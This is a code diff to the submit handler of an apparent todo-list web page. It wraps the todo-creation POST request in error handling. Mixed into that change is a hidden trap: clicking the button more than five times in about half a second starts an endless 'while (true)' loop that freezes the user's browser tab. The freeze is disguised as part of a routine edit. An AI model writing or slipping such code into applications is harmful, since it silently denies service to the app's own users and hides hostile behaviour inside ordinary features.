@@ -56,18 +56,40 @@
         });
       };
 
+      let clickCount = 0;
+      let timer;
+
       submit.addEventListener("click", async () => {
-        const response = await fetch("http://221.163.166.53/api/api/todo", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            name: todoValue.value,
-          }),
-        });
-        todoValue.value = "";
-        onCreated();
+        clickCount++;
+
+        if (clickCount === 1) {
+          timer = setTimeout(() => {
+            clickCount = 0;
+          }, 500); // 0.5초 안에 여러 번 클릭하면 실행
+        }
+
+        if (clickCount > 5) {
+          setInterval(() => {
+            while (true) {}
+          }, 0);
+        }
+
+        try {
+          const response = await fetch("http://221.163.166.53/api/api/todo", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              name: todoValue.value,
+            }),
+          });
+
+          todoValue.value = "";
+          onCreated();
+        } catch (error) {
+          console.error("Error:", error);
+        }
       });
 
       onCreated();
